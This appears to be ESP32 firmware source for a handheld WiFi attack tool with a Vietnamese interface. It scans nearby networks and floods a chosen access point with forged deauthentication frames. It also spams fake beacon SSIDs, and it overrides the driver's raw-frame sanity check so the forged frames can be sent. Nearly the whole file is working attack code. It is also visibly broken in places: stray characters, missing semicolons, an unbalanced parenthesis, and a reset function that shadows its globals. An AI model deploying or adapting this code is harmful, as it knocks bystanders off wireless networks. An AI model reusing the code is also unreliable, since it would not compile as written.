#include "wificonfig.h"

enum WIFI_Page {
  IDLE,
  DEAUTH_WIFI_PAGE,
  BEACON_WIFI_PAGE
}

std::vector<Network> networks;
unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 500;
WIFI_Page currentPage = IDLE;
int deauthwifiIndex = 0;
bool deauthwifiRunning = false;
bool beaconwifiRunning = false;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
  if (arg == 31337)
      return 1;
    else
      return 0;
}

void handleButtonPress(int pin, void (*callback)) {
  static unsigned long lastPressTime[8] = {0};
  static uint8_t lastState[8] = {HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH};

  int index = pin % 8;
  uint8_t currentState = digitalRead(pin);

  if (currentState == LOW && lastState[index] == HIGH) {
    unsigned long currentTime = millis();

    if ((currentTime - lastPressTime[index]) > debounceDelay) {
      callback();
      lastPressTime[index] = currentTime;
    }
  }

  lastState[index] = currentState;
}

bool isButtonPressed(int pin) {
  return !digitalRead(pin);
} a

void drawWifiStatus() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  if (currentPage == DEAUTH_WIFI_PAGE) {
    display.println("Wifi Deauther");
    display.println(deauthwifiRunning ? "Dang Pha Wifi" : "Dung Pha.");
  } else {
    display.println("Wifi Beacon");
    display.println(beaconwifiRunning ? "Dang Chay" : "Dung Lai");
  }
  display.display();
}

void wifiDeInit() {
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect();
  WiFi.mode(WIFI_OFF);
  
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_stop();
  esp_wifi_restore();
  esp_wifi_deinit();
  esp_netif_deinit(); 
}

void startWifiScan() {
  networks.clear();
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n; ++i) {
    Network net;
    net.ssid = WiFi.SSID(i);
    net.channel = WiFi.channel(i);
    memcpy(net.bssid, WiFi.BSSID(i), 6);
    networks.push_back(net);
  }
}

/*
  Beacon Spam
*/


void beaconSetup(){
  WiFi.mode(WIFI_MODE_AP);
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
}

void beaconLoop() {
  for(int i = 0; i < 10; i++) {
    // Set random MAC address
    beacon_frame[10] = beacon_frame[16] = random(256);
    beacon_frame[11] = beacon_frame[17] = random(256);
    beacon_frame[12] = beacon_frame[18] = random(256);
    beacon_frame[13] = beacon_frame[19] = random(256);
    beacon_frame[14] = beacon_frame[20] = random(256);
    beacon_frame[15] = beacon_frame[21] = random(256);
      
    // Set SSID length
    int ssidLen = strlen(ssids[i]);
    beacon_frame[37] = ssidLen;
      
    // Set SSID
    for(int j = 0; j < ssidLen; j++) {
      beacon_frame[38 + j] = ssids[i][j];
    }
      
    // Send packet
    esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
    delay(1);
  }
}


/*
  Deauther ESP32 By ShineNagumo (Xun Anh Nguyen)
*/


void send_deauth_frame(uint8_t bssid[6], uint8_t chan) {
  /*
   Send Deauth Frame By justcallmekoko (ESP32 Marauder)
  */

  esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
  delay(1);

  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
}

void deautherSetup() {
  nvs_flash_init();
  tcpip_adapter_init();

  feature_exit_requested = true;

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  wifi_config_t ap_config = {0};

  ap_config.ap.ssid_len = 0;
  ap_config.ap.ssid_hidden = 1;
  ap_config.ap.beacon_interval = 10000;
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(82);
}

void deautherPreLoop(int idx) {
  if (idx < 0 || idx >= networks.size()) return;
  for (int i = 0; i < 55; i++){
    send_deauth_frame(networks[idx].bssid, networks[idx].channel);
  }
}

void deautherPostLoop() {
  deauthwifiRunning = true;
  drawWifiStatus();
  digitalWrite(STATUS_LED, HIGH);
  while (!feature_exit_requested) {
    deautherPreLoop(deauthwifiIndex);
    if (isButtonPressed(BTN_MID)) {
      unsigned long holdStart = millis();
      while (isButtonPressed(BTN_MID)) {
        if (millis() - holdStart > 2000) {
          wifiDeInit();
          feature_exit_requested = false;
          break;
        }
      }
    }
  }
  digitalWrite(STATUS_LED, LOW);
  deauthwifiRunning = false;
  drawWifiStatus();
  while (isButtonPressed(BTN_MID));
  WIFI_return_to_mainmenu();
}

void WIFI_return_to_mainmenu() {
  WIFI_Page currentPage = IDLE;
  int deauthwifiIndex = 0;
  bool deauthwifiRunning = false;
  bool beaconwifiRunning = false;
  drawMainMenu();
  handleMenuButton();
  
}

void drawReScan() {
  int timeoutleft = 6;
  for (int i = 0 ; i < 5 ; i++) {
    timeoutleft--
    display.clearDisplay();
    display.setCursor(0, 0);
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.println("Khong tim thay WiFi");
    display.println("Se ReScan Trong:");
    display.print(" " + timeoutleft);
    delay(5000)
  }
  startWifiScan();
  deauthwifiIndex = 0;
  drawWifiListToDeauth();
}


void drawWifiListToDeauth() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  if (networks.empty()) {
    drawReScan();
  } else {
    display.println("Chon WiFi de Deauth");
    int start = max(0, deauthwifiIndex- 1);
    for (int i = start; i < min((int)networks.size(), start + 3); ++i) {
      if (i == deauthwifiIndex) display.print("> "); else display.print("  ");
      display.print(networks[i].ssid);
      if (isButtonPressed(BTN_LEFT) && isButtonPressed(BTN_RIGHT)) {
        unsigned long holdStart = millis();
        while ((isButtonPressed(BTN_LEFT) && isButtonPressed(BTN_RIGHT)) {
          if (millis() - holdStart > 2000) {
            WIFI_return_to_mainmenu();
            return;
          }
        }
      }
    }
  }
  display.display();
}

void changeWifiNext() {
  if (!networks.empty()) {
    deauthwifiIndex = (deauthwifiIndex + 1) % networks.size();
    drawWifiListToDeauth();
  }
}

void changeWifiPrev() {
  if (!networks.empty()) {
    deauthwifiIndex = (deauthwifiIndex - 1 + networks.size()) % networks.size();
    drawWifiListToDeauth();
  }
}

void WifiDeauthhandleButton() {
  currentPage = DEAUTH_WIFI_PAGE;
  handleButtonPress(BTN_RIGHT, changeWifiNext);
  handleButtonPress(BTN_LEFT, changeWifiPrev);
  handleButtonPress(BTN_MID, deautherPostLoop);
}